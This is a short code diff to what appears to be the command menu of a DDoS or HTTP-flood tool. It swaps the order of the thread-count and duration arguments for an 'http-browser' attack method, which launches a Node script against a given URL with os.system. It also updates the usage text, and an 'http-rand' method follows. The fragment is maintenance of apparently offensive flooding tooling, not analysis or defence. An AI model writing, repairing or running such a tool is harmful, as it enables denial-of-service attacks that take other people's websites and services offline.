@@ -330,12 +330,12 @@ def main():
         elif "http-browser" in cnc:
             try:
                 url = cnc.split()[1]
-                time = cnc.split()[2]
-                thread = cnc.split()[3]
-                os.system(f'node HTTP-BROWSER.js {url} {time} {thread}')
+                thread = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'node HTTP-BROWSER.js {url} {thread} {time}')
             except IndexError:
-                print('Usage: http-browser <url> <time> <threads>')
-                print('Example: http-browser http://example.com 60 1250')
+                print('Usage: http-browser <url> <thread> <time>')
+                print('Example: http-browser http://example.com 1250 60')
 
         elif "http-rand" in cnc:
             try:
